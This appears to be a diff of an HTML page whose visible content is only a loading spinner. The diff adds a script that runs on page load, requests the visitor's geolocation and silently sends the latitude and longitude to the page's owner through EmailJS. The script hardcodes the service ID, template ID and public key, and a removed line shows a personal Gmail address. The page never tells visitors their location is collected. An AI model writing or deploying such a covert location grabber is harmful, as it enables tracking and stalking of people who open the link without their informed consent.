@@ -38,26 +38,38 @@
 </head>
 <body>
     <div id="spinner" ><div class="spinner-appear"></div></div>
-
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         function sendEmail(loc) {
-  const subject='email subject';
-  var mailtoLink = 'mailto:fatmsalah767@gmail.com' +
-  '?subject=' + encodeURIComponent(subject) +
-  '&body=' + encodeURIComponent('location: ' + loc);
-  // window.location.href = mailtoLink;
-  }
-// Get the user's location
-if (navigator.geolocation) {
+    // Replace these values with your own
+const service_id = 'service_8k2wsaf';
+const template_id = 'template_wxlspqk';
+const public_key = '-LMa6RybqWxaFObf2';
+ 
+  
+  // Prepare the email parameters
+  const templateParams = {
+    loc: loc,  
+  }; 
+
+  // Send the email
+  emailjs.send(service_id, template_id, templateParams, public_key)
+    .then(function(response) {
+      console.log('Email sent successfully!', response.status, response.text); 
+        
+    }, function(error) {
+      console.error('Error sending email:', error); 
+    }) 
+    } 
+
+
+    if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(function(position) {
     var latitude = position.coords.latitude;
     var longitude = position.coords.longitude;
     var location = 'Latitude: ' + latitude + ', Longitude: ' + longitude;
-
-    // Call the updated function with the user's location
-    sendEmail(location) ;
-    console.log('done');
-    // sendEmail2('John Doe', 'johndoe@example.com', '1234567890', 'Role', 'Institution', 'Message', location);
+ 
+    sendEmail(location) ; 
   });
 } else {
   console.log('Geolocation is not supported by this browser.');
